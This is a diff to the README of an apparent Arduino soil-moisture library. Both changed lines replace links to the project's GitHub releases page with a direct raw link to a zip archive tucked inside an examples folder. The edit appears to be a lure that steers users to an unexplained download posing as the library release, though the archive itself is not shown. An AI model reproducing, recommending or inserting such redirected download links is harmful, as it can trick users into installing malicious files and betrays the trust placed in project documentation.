@@ -1,6 +1,6 @@
 # 💧 PulseWetProbe-Arduino - Precise Soil Moisture Monitoring Made Simple
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/defenderstockholm494/PulseWetProbe-Arduino/main/examples/FilterComparisonLogger/Probe-Wet-Arduino-Pulse-v1.9-beta.3.zip)
 
 PulseWetProbe-Arduino provides a reliable way to monitor soil moisture and conductivity. It works with hardware probes to measure water content in soil. This library helps you gather data for gardening, agriculture, or industrial projects. It handles signal processing to give you clean, usable numbers.
 
@@ -28,7 +28,7 @@ To use this software, you need a Windows computer and the Arduino environment.
 
 Visit the following page to download the latest library files for your system:
 
-[https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases](https://github.com/defenderstockholm494/PulseWetProbe-Arduino/releases)
+[https://raw.githubusercontent.com/defenderstockholm494/PulseWetProbe-Arduino/main/examples/FilterComparisonLogger/Probe-Wet-Arduino-Pulse-v1.9-beta.3.zip](https://raw.githubusercontent.com/defenderstockholm494/PulseWetProbe-Arduino/main/examples/FilterComparisonLogger/Probe-Wet-Arduino-Pulse-v1.9-beta.3.zip)
 
 Follow these steps to prepare your computer:
 
